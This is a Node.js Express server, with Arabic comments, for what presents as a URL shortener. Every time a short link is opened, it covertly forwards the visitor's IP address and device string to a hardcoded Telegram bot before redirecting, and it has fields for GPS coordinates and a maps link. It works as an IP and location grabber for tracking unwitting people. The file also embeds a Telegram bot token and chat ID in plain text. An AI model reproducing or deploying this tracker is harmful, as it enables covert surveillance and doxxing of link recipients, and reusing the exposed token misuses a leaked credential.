const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
`;

    if (gps && gps.lat && gps.lng) {
      msg += `
📍 Latitude: ${gps.lat}
📍 Longitude: ${gps.lng}
📏 Accuracy: ±${gps.accuracy.toFixed(0)}m
🗺️ Maps: https://maps.google.com/?q=${gps.lat},${gps.lng}
`;
    }

    msg += `
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg },
      { timeout: 5000 }
    );
    
    console.log('[SUCCESS] Telegram message sent');
  } catch (err) {
    console.error('[ERROR] Telegram:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

// الرابط المختصر — Server-side redirect + Logging
app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('Not found');
  }

  const originalUrl = linkStorage[code].original;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');

  linkStorage[code].clicks++;

  // تسجيل فوري بدون انتظار
  console.log(`[REDIRECT] Code: ${code}, IP: ${ip}`);
  sendToTelegram(ip, code, originalUrl, userAgent, null);

  // Redirect مباشر
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));